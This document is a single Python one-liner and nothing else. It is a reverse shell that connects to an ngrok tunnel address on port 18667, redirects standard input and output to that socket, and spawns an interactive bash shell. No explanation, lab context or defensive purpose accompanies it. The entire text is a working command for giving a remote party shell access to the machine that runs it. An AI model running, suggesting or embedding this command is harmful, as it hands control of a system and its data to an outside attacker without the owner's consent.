python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",18667));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
